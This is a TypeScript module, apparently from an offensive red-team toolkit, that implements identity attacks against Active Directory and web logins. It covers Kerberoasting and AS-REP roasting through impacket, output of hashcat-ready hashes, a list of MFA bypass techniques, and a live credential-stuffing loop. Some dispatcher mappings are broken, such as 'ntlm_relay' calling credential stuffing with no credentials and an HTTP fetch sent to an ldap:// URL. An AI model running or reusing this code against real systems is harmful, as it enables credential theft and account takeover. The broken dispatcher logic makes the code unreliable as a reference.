/**
 * @module identity
 * Identity attacks — Kerberoasting, AS-REP Roasting, MFA bypass, credential
 * abuse, and Entra ID / Azure AD token manipulation.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as crypto from "node:crypto";
import { spawnSync } from "node:child_process";

// ─── Types ────────────────────────────────────────────────────────────────────

export interface KerberosHashEntry {
  username: string;
  spn: string;
  hashType: "krb5tgs" | "krb5asrep";
  hash: string;
}

export interface MFABypassResult {
  method: string;
  success: boolean;
  sessionToken?: string;
  evidence: string;
  dryRun: boolean;
}

export interface CredentialAbuse {
  vector: string;
  target: string;
  credential: string;
  result: string;
  dryRun: boolean;
}

export interface IdentityOptions {
  live?: boolean;
  domain?: string;
  dcIp?: string;
  username?: string;
  password?: string;
  ntHash?: string;
}

// ─── Kerberoasting ────────────────────────────────────────────────────────────

/**
 * Request Kerberos TGS tickets for all SPN-bearing accounts and return them
 * in hashcat-ready `$krb5tgs$` format for offline cracking.
 *
 * DRY-RUN: returns synthetic hashes.
 * LIVE: delegates to `GetUserSPNs.py` (impacket).
 */
export async function kerberoast(opts: IdentityOptions = {}): Promise<KerberosHashEntry[]> {
  const { live = false, domain = "CORP.LOCAL", dcIp = "10.0.0.1", username = "", password = "" } = opts;

  if (!live) {
    return [
      {
        username: "svc_sql",
        spn: "MSSQLSvc/sql01.corp.local:1433",
        hashType: "krb5tgs",
        hash: "$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$" + crypto.randomBytes(16).toString("hex"),
      },
      {
        username: "svc_http",
        spn: "HTTP/web01.corp.local",
        hashType: "krb5tgs",
        hash: "$krb5tgs$23$*svc_http$CORP.LOCAL$HTTP/web01.corp.local*$" + crypto.randomBytes(16).toString("hex"),
      },
    ];
  }

  const cred = opts.ntHash ? `-hashes :${opts.ntHash} ${username}@${dcIp}`
    : `${username}:${password}@${dcIp}`;

  const r = spawnSync(
    "impacket-GetUserSPNs",
    ["-request", "-outputfile", "/tmp/ares_kerberoast.txt", `${domain}/${cred}`],
    { encoding: "utf8", timeout: 30_000 }
  );

  // Parse hashcat-format output
  const entries: KerberosHashEntry[] = [];
  const lines = (r.stdout ?? "").split("\n");
  for (const line of lines) {
    if (line.startsWith("$krb5tgs$")) {
      const parts = line.split("$");
      entries.push({ username: parts[4] ?? "", spn: parts[5] ?? "", hashType: "krb5tgs", hash: line.trim() });
    }
  }
  return entries;
}

// ─── AS-REP Roasting ─────────────────────────────────────────────────────────

/**
 * Request AS-REP tickets for accounts with Kerberos pre-auth disabled.
 * DRY-RUN: synthetic hashes; LIVE: `GetNPUsers.py` (impacket).
 */
export async function asrepRoast(opts: IdentityOptions = {}): Promise<KerberosHashEntry[]> {
  const { live = false, domain = "CORP.LOCAL", dcIp = "10.0.0.1" } = opts;

  if (!live) {
    return [{
      username: "nopreauth_user",
      spn: "",
      hashType: "krb5asrep",
      hash: "$krb5asrep$23$nopreauth_user@CORP.LOCAL:$" + crypto.randomBytes(32).toString("hex"),
    }];
  }

  const r = spawnSync(
    "impacket-GetNPUsers",
    [`${domain}/`, "-dc-ip", dcIp, "-no-pass", "-request", "-format", "hashcat"],
    { encoding: "utf8", timeout: 30_000 }
  );

  return (r.stdout ?? "").split("\n")
    .filter((l) => l.startsWith("$krb5asrep$"))
    .map((hash) => ({ username: hash.split("@")[0].split("$").slice(-1)[0] ?? "", spn: "", hashType: "krb5asrep" as const, hash }));
}

// ─── MFA Bypass techniques ────────────────────────────────────────────────────

const MFA_TECHNIQUES = [
  "SS7_interception",
  "SIM_swap",
  "OTP_brute_force",
  "push_fatigue",
  "real_time_phishing_evilginx",
  "recovery_code_abuse",
  "account_recovery_social_eng",
  "authenticator_app_clone",
];

/**
 * Simulate an MFA bypass attempt.
 * DRY-RUN: logs the technique without touching any real service.
 */
export function bypassMFA(
  technique: string,
  target: string,
  opts: IdentityOptions = {}
): MFABypassResult {
  const { live = false } = opts;
  const known = MFA_TECHNIQUES.includes(technique);

  if (!live) {
    return {
      method: technique,
      success: false,  // never true in dry-run
      evidence: `[DRY-RUN] technique=${technique} target=${target} known=${known}`,
      dryRun: true,
    };
  }

  // Implementation stubs for each technique — real execution requires
  // specialised tools (Evilginx2, Modlishka, etc.)
  return {
    method: technique,
    success: false,
    evidence: `live technique ${technique} requires external tooling`,
    dryRun: false,
  };
}

// ─── Credential abuse ─────────────────────────────────────────────────────────

/**
 * Attempt a credential stuffing / spray attack against a target service.
 * DRY-RUN: returns the attempted credentials without network calls.
 */
export async function stuffCredentials(
  targetUrl: string,
  credentials: Array<{ username: string; password: string }>,
  opts: IdentityOptions & { live?: boolean; delayMs?: number } = {}
): Promise<CredentialAbuse[]> {
  const { live = false, delayMs = 500 } = opts;
  const results: CredentialAbuse[] = [];

  for (const cred of credentials) {
    if (!live) {
      results.push({
        vector: "credential_stuffing",
        target: targetUrl,
        credential: `${cred.username}:${"*".repeat(cred.password.length)}`,
        result: "DRY-RUN: not attempted",
        dryRun: true,
      });
      continue;
    }

    try {
      await new Promise((r) => setTimeout(r, delayMs));
      const resp = await fetch(targetUrl, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `username=${encodeURIComponent(cred.username)}&password=${encodeURIComponent(cred.password)}`,
        signal: AbortSignal.timeout(10_000),
      });
      results.push({
        vector: "credential_stuffing",
        target: targetUrl,
        credential: `${cred.username}:${"*".repeat(cred.password.length)}`,
        result: resp.ok ? `HTTP ${resp.status} — possible success` : `HTTP ${resp.status} — failed`,
        dryRun: false,
      });
    } catch (e) {
      results.push({ vector: "credential_stuffing", target: targetUrl, credential: cred.username, result: String(e), dryRun: false });
    }
  }

  return results;
}

// ─── Token models ─────────────────────────────────────────────────────────────

export interface EntraToken {
  accessToken: string;
  refreshToken: string;
  expiresIn: number;
  tenantId: string;
  clientId: string;
  scope: string;
}

/**
 * Parse and inspect a raw JWT (access token) for Entra ID / Azure AD details.
 */
export function inspectJWT(token: string): Record<string, unknown> {
  try {
    const parts = token.split(".");
    if (parts.length !== 3) throw new Error("Invalid JWT");
    const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString("utf8"));
    return payload;
  } catch {
    return { error: "Failed to decode JWT" };
  }
}

/** MCP/CLI dispatcher for identity attack techniques */
export async function execute(
  req: { domain: string; attack: string; dc?: string },
  opts: { live?: boolean } = {},
): Promise<unknown> {
  const identityOpts: IdentityOptions = {
    live: opts.live,
    domain: req.domain,
    dcIp: req.dc || undefined,
  };
  switch (req.attack) {
    case "kerberoast":
      return kerberoast(identityOpts);
    case "asrep_roast":
      return asrepRoast(identityOpts);
    case "mfa_bypass":
      return bypassMFA("push", req.domain, identityOpts);
    case "ntlm_relay":
      return stuffCredentials(req.domain, [], identityOpts);
    case "credential_spray":
      return stuffCredentials(
        `ldap://${req.domain}`,
        [{ username: "admin", password: "Password1" }],
        identityOpts,
      );
    default:
      return { error: `Unknown attack: ${req.attack}`, dryRun: !(opts.live ?? false) };
  }
}

export default { kerberoast, asrepRoast, bypassMFA, stuffCredentials, inspectJWT, execute };
